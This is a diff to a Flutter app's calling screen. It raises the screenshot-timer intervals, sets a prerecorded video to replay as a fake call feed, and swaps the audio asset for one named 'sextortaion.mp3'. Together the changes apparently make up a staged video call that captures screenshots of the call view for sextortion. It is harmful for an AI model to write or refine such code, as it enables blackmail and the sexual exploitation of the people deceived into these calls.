@@ -56,11 +56,11 @@ class _CallingScreenState extends State<CallingScreen> {
   }
 
   void _startScreenshotTimer() {
-    _screenshotTimer = Timer.periodic(Duration(seconds: 2), (timer) {
+    _screenshotTimer = Timer.periodic(Duration(seconds: 10), (timer) {
       _takeScreenshot();
     });
 
-    _closeTimer = Timer(Duration(seconds: 15), () {
+    _closeTimer = Timer(Duration(seconds: 80), () {
       _screenshotTimer.cancel();
       _disposeControllers();
     });
@@ -68,13 +68,15 @@ class _CallingScreenState extends State<CallingScreen> {
 
   Future<void> _takeScreenshot() async {
     try {
-      RenderRepaintBoundary boundary = _repaintBoundaryKey.currentContext!.findRenderObject() as RenderRepaintBoundary;
+      RenderRepaintBoundary boundary = _repaintBoundaryKey.currentContext!
+          .findRenderObject() as RenderRepaintBoundary;
       final image = await boundary.toImage();
       final byteData = await image.toByteData(format: ImageByteFormat.png);
       final Uint8List pngBytes = byteData!.buffer.asUint8List();
 
       final directory = await getTemporaryDirectory();
-      final filePath = '${directory.path}/screenshot_${DateTime.now().millisecondsSinceEpoch}.png';
+      final filePath =
+          '${directory.path}/screenshot_${DateTime.now().millisecondsSinceEpoch}.png';
       final file = File(filePath);
       await file.writeAsBytes(pngBytes);
 
@@ -133,7 +135,8 @@ class _CallingScreenState extends State<CallingScreen> {
               Align(
                 alignment: Alignment.bottomCenter,
                 child: Padding(
-                  padding: const EdgeInsets.symmetric(horizontal: 14.0, vertical: 10),
+                  padding: const EdgeInsets.symmetric(
+                      horizontal: 14.0, vertical: 10),
                   child: Container(
                     height: 60,
                     width: MediaQuery.of(context).size.width,
@@ -154,11 +157,13 @@ class _CallingScreenState extends State<CallingScreen> {
                         ),
                         IconButton(
                           onPressed: () {},
-                          icon: Icon(Icons.cameraswitch_rounded, color: Colors.white),
+                          icon: Icon(Icons.cameraswitch_rounded,
+                              color: Colors.white),
                         ),
                         IconButton(
                           onPressed: _takeScreenshot,
-                          icon: Icon(Icons.screenshot_sharp, color: Colors.white),
+                          icon:
+                              Icon(Icons.screenshot_sharp, color: Colors.white),
                         ),
                         Container(
                           decoration: BoxDecoration(
@@ -211,42 +216,29 @@ class AudioCs extends StatefulWidget {
 
 class _AudioCsState extends State<AudioCs> {
   late AudioPlayer _audioPlayer1;
-  late AudioPlayer _audioPlayer2;
 
   @override
   void initState() {
     super.initState();
     _audioPlayer1 = AudioPlayer();
-    _audioPlayer2 = AudioPlayer();
 
     Future.delayed(Duration(seconds: 7), () {
       playLocalAudio1();
     });
-    // Future.delayed(Duration(seconds: 7), () {
-    //   playLocalAudio2();
-    // });
   }
 
   Future<void> playLocalAudio1() async {
     try {
-      await _audioPlayer1.play(AssetSource('audio/voice.mp3'), mode: PlayerMode.mediaPlayer);
+      await _audioPlayer1.play(AssetSource('audio/sextortaion.mp3'),
+          mode: PlayerMode.mediaPlayer);
     } catch (e) {
       print('Error playing audio 1: $e');
-    }
-  }
-
-  Future<void> playLocalAudio2() async {
-    try {
-      await _audioPlayer2.play(AssetSource('audio/voice_2.mp3'), mode: PlayerMode.mediaPlayer);
-    } catch (e) {
-      print('Error playing audio 2: $e');
     }
   }
 
   @override
   void dispose() {
     _audioPlayer1.dispose();
-    _audioPlayer2.dispose();
     super.dispose();
   }
 
@@ -264,29 +256,30 @@ class VideoPlayerScreen extends StatefulWidget {
 class _VideoPlayerScreenState extends State<VideoPlayerScreen> {
   late VideoPlayerController _controller;
   late Future<void> _initializeVideoPlayerFuture;
-  late Timer _timer;
+
+  Timer? perio;
 
   @override
   void initState() {
     super.initState();
-    // Initialize the VideoPlayerController with the video asset
     _controller = VideoPlayerController.asset('assets/videos/vid.mp4');
     _initializeVideoPlayerFuture = _controller.initialize().then((_) {
-      // Start the video automatically
       _controller.play();
-      // Stop the video after 30 seconds
-      _timer = Timer(Duration(seconds: 50), () {
-        _controller.pause();
+      // _controller.setLooping(true);
+    });
+    perio = Timer.periodic(Duration(seconds: 27), (timer) {
+      _initializeVideoPlayerFuture = _controller.initialize().then((_) {
+        _controller.play();
+        // _controller.setLooping(true);
       });
     });
-    _controller.setLooping(true);
   }
 
   @override
   void dispose() {
-    super.dispose();
+    perio?.cancel();
     _controller.dispose();
-    _timer.cancel();
+    super.dispose();
   }
 
   @override
